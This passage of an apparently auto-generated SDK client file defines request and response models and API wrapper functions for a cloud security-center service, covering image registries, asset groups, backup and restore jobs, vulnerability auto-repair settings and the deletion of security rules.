    registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='1.13.XXX.XXX'),
    registryName?: string(name='RegistryName', description='The alias of the image repository.', example='fanyi'),
    registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **CI/CD**: Jenkins', example='CI/CD'),
    token?: string(name='Token', description='The authentication token of the user.', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30'),
    userName?: string(name='UserName', description='The username.', example='RegistryUser'),
    vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2vchkxmf2j9yjt3x2****'),
    whiteList?: string(name='WhiteList', description='The whitelist.', example='192.168.XXX.XXX'),
  }(name='Data', description='The result of creating the image repository.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='1AF1E723-53F1-55BF-A4B2-15CB7A32****'),
  timeCost?: long(name='TimeCost', description='The time consumed. Unit: seconds.', example='1'),
}

model CreateJenkinsImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateJenkinsImageRegistryResponseBody(name='body'),
}

async function createJenkinsImageRegistryWithOptions(request: CreateJenkinsImageRegistryRequest, runtime: Util.RuntimeOptions): CreateJenkinsImageRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.domainName)) {
    body['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.extraParam)) {
    body['ExtraParam'] = request.extraParam;
  }
  if (!Util.isUnset(request.netType)) {
    body['NetType'] = request.netType;
  }
  if (!Util.isUnset(request.password)) {
    body['Password'] = request.password;
  }
  if (!Util.isUnset(request.persistenceDay)) {
    body['PersistenceDay'] = request.persistenceDay;
  }
  if (!Util.isUnset(request.protocolType)) {
    body['ProtocolType'] = request.protocolType;
  }
  if (!Util.isUnset(request.regionId)) {
    body['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.registryHostIp)) {
    body['RegistryHostIp'] = request.registryHostIp;
  }
  if (!Util.isUnset(request.registryName)) {
    body['RegistryName'] = request.registryName;
  }
  if (!Util.isUnset(request.registryType)) {
    body['RegistryType'] = request.registryType;
  }
  if (!Util.isUnset(request.registryVersion)) {
    body['RegistryVersion'] = request.registryVersion;
  }
  if (!Util.isUnset(request.transPerHour)) {
    body['TransPerHour'] = request.transPerHour;
  }
  if (!Util.isUnset(request.userName)) {
    body['UserName'] = request.userName;
  }
  if (!Util.isUnset(request.vpcId)) {
    body['VpcId'] = request.vpcId;
  }
  if (!Util.isUnset(request.whiteList)) {
    body['WhiteList'] = request.whiteList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'CreateJenkinsImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createJenkinsImageRegistry(request: CreateJenkinsImageRegistryRequest): CreateJenkinsImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return createJenkinsImageRegistryWithOptions(request, runtime);
}

model CreateOrUpdateAssetGroupRequest {
  groupId?: long(name='GroupId', example='55426'),
  groupName?: string(name='GroupName', description='CreateOrUpdateAssetGroup', example='test'),
  uuids?: string(name='Uuids', description='Modifies the mapping between an asset and an asset group. For example, you can call this operation to modify the server group to which the asset belongs or the asset list of the asset group.', example='aq12-***,s23***'),
}

model CreateOrUpdateAssetGroupResponseBody = {
  groupId?: long(name='GroupId', example='9935302'),
  requestId?: string(name='RequestId', example='E70074C8-DFB4-44C5-96C7-909DD231D68A'),
}

model CreateOrUpdateAssetGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateOrUpdateAssetGroupResponseBody(name='body'),
}

/**
  * The ID of the request, which is used to locate and troubleshoot issues.
  *
  * @param request CreateOrUpdateAssetGroupRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateOrUpdateAssetGroupResponse
 */
async function createOrUpdateAssetGroupWithOptions(request: CreateOrUpdateAssetGroupRequest, runtime: Util.RuntimeOptions): CreateOrUpdateAssetGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.groupName)) {
    query['GroupName'] = request.groupName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOrUpdateAssetGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The ID of the request, which is used to locate and troubleshoot issues.
  *
  * @param request CreateOrUpdateAssetGroupRequest
  * @return CreateOrUpdateAssetGroupResponse
 */
async function createOrUpdateAssetGroup(request: CreateOrUpdateAssetGroupRequest): CreateOrUpdateAssetGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOrUpdateAssetGroupWithOptions(request, runtime);
}

model CreateRestoreJobRequest {
  includes?: string(name='Includes', description='The directory in which the files included in the restoration task are located. This parameter is specified when you create the anti-ransomware policy. The value is a directory that requires protection.', example='["root"]'),
  snapshotHash?: string(name='SnapshotHash', description='The hash value of the snapshot.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='d4b399edaad94b038e8f91873f19e3eae010ca30798fc36db3a164dd343f****'),
  snapshotId?: string(name='SnapshotId', description='The ID of the snapshot that you want to use for restoration.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='s-00023dhaatxp18mh****'),
  snapshotVersion?: string(name='SnapshotVersion', description='The version of the backup data.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='165570544****'),
  sourceType?: string(name='SourceType', description='The type of the data source. Valid values:

*   **ECS_FILE**: backup snapshots for Elastic Compute Service (ECS) files
*   **File**: backup snapshots for on-premises servers', example='ECS_FILE'),
  target?: string(name='Target', description='The path to which you want to restore data.', example='/root/testfls'),
  uuid?: string(name='Uuid', description='The UUID of the server whose data you want to restore.', example='inet-ecs-4e876cb0-09f7-43b8-82ef-4bc7a93769b5'),
  vaultId?: string(name='VaultId', description='The ID of the backup vault that is used in the restoration task.

> You can call the [DescribeSnapshots](~~DescribeSnapshots~~) operation to obtain the value of this parameter.', example='v-0002n12wokck2q0x****'),
}

model CreateRestoreJobResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BD4B24CE-E5C4-5727-B731-BE85F1D4****'),
}

model CreateRestoreJobResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateRestoreJobResponseBody(name='body'),
}

async function createRestoreJobWithOptions(request: CreateRestoreJobRequest, runtime: Util.RuntimeOptions): CreateRestoreJobResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.includes)) {
    query['Includes'] = request.includes;
  }
  if (!Util.isUnset(request.snapshotHash)) {
    query['SnapshotHash'] = request.snapshotHash;
  }
  if (!Util.isUnset(request.snapshotId)) {
    query['SnapshotId'] = request.snapshotId;
  }
  if (!Util.isUnset(request.snapshotVersion)) {
    query['SnapshotVersion'] = request.snapshotVersion;
  }
  if (!Util.isUnset(request.sourceType)) {
    query['SourceType'] = request.sourceType;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vaultId)) {
    query['VaultId'] = request.vaultId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateRestoreJob',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createRestoreJob(request: CreateRestoreJobRequest): CreateRestoreJobResponse {
  var runtime = new Util.RuntimeOptions{};
  return createRestoreJobWithOptions(request, runtime);
}

model CreateServiceLinkedRoleRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', example='AliyunServiceRoleForSas'),
}

model CreateServiceLinkedRoleResponseBody = {
  requestId?: string(name='RequestId', example='B94243D2-9342-4D82-87B9-DF9A038A87E1'),
}

model CreateServiceLinkedRoleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateServiceLinkedRoleResponseBody(name='body'),
}

async function createServiceLinkedRoleWithOptions(request: CreateServiceLinkedRoleRequest, runtime: Util.RuntimeOptions): CreateServiceLinkedRoleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.serviceLinkedRole)) {
    query['ServiceLinkedRole'] = request.serviceLinkedRole;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateServiceLinkedRole',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createServiceLinkedRole(request: CreateServiceLinkedRoleRequest): CreateServiceLinkedRoleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createServiceLinkedRoleWithOptions(request, runtime);
}

model CreateSimilarSecurityEventsQueryTaskRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', example='14323'),
  similarEventScenarioCode?: string(name='SimilarEventScenarioCode', example='default'),
  sourceIp?: string(name='SourceIp', description='CreateSimilarSecurityEventsQueryTask', example='1.2.XX.XX'),
}

model CreateSimilarSecurityEventsQueryTaskResponseBody = {
  createSimilarSecurityEventsQueryTaskResponse?: {
    status?: string(name='Status', example='New'),
    taskId?: long(name='TaskId', example='2915'),
  }(name='CreateSimilarSecurityEventsQueryTaskResponse'),
  requestId?: string(name='RequestId', example='5861EE3E-F0B3-48B8-A5DC-A5080BFBE052'),
}

model CreateSimilarSecurityEventsQueryTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateSimilarSecurityEventsQueryTaskResponseBody(name='body'),
}

async function createSimilarSecurityEventsQueryTaskWithOptions(request: CreateSimilarSecurityEventsQueryTaskRequest, runtime: Util.RuntimeOptions): CreateSimilarSecurityEventsQueryTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.similarEventScenarioCode)) {
    query['SimilarEventScenarioCode'] = request.similarEventScenarioCode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSimilarSecurityEventsQueryTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createSimilarSecurityEventsQueryTask(request: CreateSimilarSecurityEventsQueryTaskRequest): CreateSimilarSecurityEventsQueryTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSimilarSecurityEventsQueryTaskWithOptions(request, runtime);
}

model CreateSuspEventNoteRequest {
  eventId?: long(name='EventId', example='668931'),
  note?: string(name='Note', example='Ignore'),
}

model CreateSuspEventNoteResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='There was an error with your request.'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  success?: boolean(name='Success', example='true'),
}

model CreateSuspEventNoteResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateSuspEventNoteResponseBody(name='body'),
}

async function createSuspEventNoteWithOptions(request: CreateSuspEventNoteRequest, runtime: Util.RuntimeOptions): CreateSuspEventNoteResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.note)) {
    query['Note'] = request.note;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateSuspEventNote',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createSuspEventNote(request: CreateSuspEventNoteRequest): CreateSuspEventNoteResponse {
  var runtime = new Util.RuntimeOptions{};
  return createSuspEventNoteWithOptions(request, runtime);
}

model CreateUniBackupPolicyRequest {
  accountName?: string(name='AccountName', example='admin'),
  accountPassword?: string(name='AccountPassword', example='Pass****'),
  databaseAddByUser?: string(name='DatabaseAddByUser', example='true'),
  databaseType?: string(name='DatabaseType', example='MYSQL'),
  fullPlan?: map[string]any(name='FullPlan', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}'),
  incPlan?: map[string]any(name='IncPlan', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}'),
  instanceId?: string(name='InstanceId', example='i-bp1fu4aqltf1huhc****'),
  policyName?: string(name='PolicyName', example='mysql-policy'),
  retention?: int32(name='Retention', example='7'),
  speedLimiter?: long(name='SpeedLimiter', example='5242880'),
  uniRegionId?: string(name='UniRegionId', example='cn-hangzhou'),
  uuid?: string(name='Uuid', example='045cad48-eb08-4047-a70c-713aec7b****'),
}

model CreateUniBackupPolicyShrinkRequest {
  accountName?: string(name='AccountName', example='admin'),
  accountPassword?: string(name='AccountPassword', example='Pass****'),
  databaseAddByUser?: string(name='DatabaseAddByUser', example='true'),
  databaseType?: string(name='DatabaseType', example='MYSQL'),
  fullPlanShrink?: string(name='FullPlan', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}'),
  incPlanShrink?: string(name='IncPlan', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}'),
  instanceId?: string(name='InstanceId', example='i-bp1fu4aqltf1huhc****'),
  policyName?: string(name='PolicyName', example='mysql-policy'),
  retention?: int32(name='Retention', example='7'),
  speedLimiter?: long(name='SpeedLimiter', example='5242880'),
  uniRegionId?: string(name='UniRegionId', example='cn-hangzhou'),
  uuid?: string(name='Uuid', example='045cad48-eb08-4047-a70c-713aec7b****'),
}

model CreateUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', example='2FAEB7D0-C0B9-581C-877A-F80F50AA****'),
}

model CreateUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateUniBackupPolicyResponseBody(name='body'),
}

async function createUniBackupPolicyWithOptions(tmpReq: CreateUniBackupPolicyRequest, runtime: Util.RuntimeOptions): CreateUniBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new CreateUniBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.fullPlan)) {
    request.fullPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.fullPlan, 'FullPlan', 'json');
  }
  if (!Util.isUnset(tmpReq.incPlan)) {
    request.incPlanShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.incPlan, 'IncPlan', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.accountName)) {
    query['AccountName'] = request.accountName;
  }
  if (!Util.isUnset(request.accountPassword)) {
    query['AccountPassword'] = request.accountPassword;
  }
  if (!Util.isUnset(request.databaseAddByUser)) {
    query['DatabaseAddByUser'] = request.databaseAddByUser;
  }
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.fullPlanShrink)) {
    query['FullPlan'] = request.fullPlanShrink;
  }
  if (!Util.isUnset(request.incPlanShrink)) {
    query['IncPlan'] = request.incPlanShrink;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.policyName)) {
    query['PolicyName'] = request.policyName;
  }
  if (!Util.isUnset(request.retention)) {
    query['Retention'] = request.retention;
  }
  if (!Util.isUnset(request.speedLimiter)) {
    query['SpeedLimiter'] = request.speedLimiter;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createUniBackupPolicy(request: CreateUniBackupPolicyRequest): CreateUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUniBackupPolicyWithOptions(request, runtime);
}

model CreateUniRestorePlanRequest {
  database?: string(name='Database', example='qtc'),
  instanceUuid?: string(name='InstanceUuid', example='ac457b30598d11ed800000163e02****'),
  policyId?: long(name='PolicyId', example='123'),
  resetScn?: string(name='ResetScn', example='925702.0'),
  resetTime?: string(name='ResetTime', example='2022-10-29 01:06:24'),
  restoreInfo?: string(name='RestoreInfo', example='{"files": {"qtc":"F:\\\\database\\\\qtc.mdf","qtc_log":"F:\\\\database\\\\qtc_0.ldf"},
"name":"qtc"}'),
  timePoint?: long(name='TimePoint', example='1656957664000'),
}

model CreateUniRestorePlanResponseBody = {
  requestId?: string(name='RequestId', example='F5CF78A7-30AA-59DB-847F-13EE3AE7****'),
}

model CreateUniRestorePlanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateUniRestorePlanResponseBody(name='body'),
}

async function createUniRestorePlanWithOptions(request: CreateUniRestorePlanRequest, runtime: Util.RuntimeOptions): CreateUniRestorePlanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.database)) {
    query['Database'] = request.database;
  }
  if (!Util.isUnset(request.instanceUuid)) {
    query['InstanceUuid'] = request.instanceUuid;
  }
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.resetScn)) {
    query['ResetScn'] = request.resetScn;
  }
  if (!Util.isUnset(request.resetTime)) {
    query['ResetTime'] = request.resetTime;
  }
  if (!Util.isUnset(request.restoreInfo)) {
    query['RestoreInfo'] = request.restoreInfo;
  }
  if (!Util.isUnset(request.timePoint)) {
    query['TimePoint'] = request.timePoint;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateUniRestorePlan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createUniRestorePlan(request: CreateUniRestorePlanRequest): CreateUniRestorePlanResponse {
  var runtime = new Util.RuntimeOptions{};
  return createUniRestorePlanWithOptions(request, runtime);
}

model CreateVulAutoRepairConfigRequest {
  reason?: string(name='Reason', description='The reason why the vulnerability can be automatically fixed.', example='TestAutoRepair'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values: 
- **cve**: Linux software vulnerability 
- **sys**: Windows system vulnerability', example='cve'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='CVE-2018-25032:zlib 1.2.11 memory corruption'),
      name?: string(name='Name', description='The name of the vulnerability.', example='anolisos:8.4:ANSA-2022:0001'),
    }
  ](name='VulAutoRepairConfigList', description='The vulnerabilities that can be automatically fixed.'),
}

model CreateVulAutoRepairConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateVulAutoRepairConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateVulAutoRepairConfigResponseBody(name='body'),
}

async function createVulAutoRepairConfigWithOptions(request: CreateVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): CreateVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.vulAutoRepairConfigList)) {
    query['VulAutoRepairConfigList'] = request.vulAutoRepairConfigList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createVulAutoRepairConfig(request: CreateVulAutoRepairConfigRequest): CreateVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return createVulAutoRepairConfigWithOptions(request, runtime);
}

model DeleteAntiBruteForceRuleRequest {
  ids?: [ long ](name='Ids'),
}

model DeleteAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
}

model DeleteAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteAntiBruteForceRuleResponseBody(name='body'),
}

async function deleteAntiBruteForceRuleWithOptions(request: DeleteAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): DeleteAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteAntiBruteForceRule(request: DeleteAntiBruteForceRuleRequest): DeleteAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteAntiBruteForceRuleWithOptions(request, runtime);
}

model DeleteBackupPolicyRequest {
  id?: long(name='Id', example='12'),
  policyVersion?: string(name='PolicyVersion', example='2.0.0'),
}

model DeleteBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DeleteBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBackupPolicyResponseBody(name='body'),
}

async function deleteBackupPolicyWithOptions(request: DeleteBackupPolicyRequest, runtime: Util.RuntimeOptions): DeleteBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteBackupPolicy(request: DeleteBackupPolicyRequest): DeleteBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupPolicyWithOptions(request, runtime);
}

model DeleteBackupPolicyMachineRequest {
  policyId?: long(name='PolicyId', example='11'),
  policyVersion?: string(name='PolicyVersion', example='2.0.0'),
  uuid?: string(name='Uuid', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
  uuidList?: [ string ](name='UuidList'),
}

model DeleteBackupPolicyMachineResponseBody = {
  requestId?: string(name='RequestId', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model DeleteBackupPolicyMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteBackupPolicyMachineResponseBody(name='body'),
}

async function deleteBackupPolicyMachineWithOptions(request: DeleteBackupPolicyMachineRequest, runtime: Util.RuntimeOptions): DeleteBackupPolicyMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteBackupPolicyMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteBackupPolicyMachine(request: DeleteBackupPolicyMachineRequest): DeleteBackupPolicyMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteBackupPolicyMachineWithOptions(request, runtime);
}

model DeleteClientUserDefineRuleRequest {
  idList?: [ long ](name='IdList'),
}

model DeleteClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', example='4552b59b-18f2-4fad-b6a2-0d59b8f2****'),
}

model DeleteClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteClientUserDefineRuleResponseBody(name='body'),
}

async function deleteClientUserDefineRuleWithOptions(request: DeleteClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): DeleteClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteClientUserDefineRule(request: DeleteClientUserDefineRuleRequest): DeleteClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteClientUserDefineRuleWithOptions(request, runtime);
}

model DeleteCustomBlockRecordRequest {
  id?: long(name='Id', example='381**'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DeleteCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DeleteCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteCustomBlockRecordResponseBody(name='body'),
}

async function deleteCustomBlockRecordWithOptions(request: DeleteCustomBlockRecordRequest, runtime: Util.RuntimeOptions): DeleteCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteCustomBlockRecord(request: DeleteCustomBlockRecordRequest): DeleteCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteCustomBlockRecordWithOptions(request, runtime);
}

model DeleteCycleTaskRequest {
  configId?: string(name='ConfigId', example='435f626256ebf564cf5ba966a539****'),
}

model DeleteCycleTaskResponseBody = {
  requestId?: string(name='RequestId', example='7DBB3D54-AF29-5BF4-8B44-9CFA94F50****'),
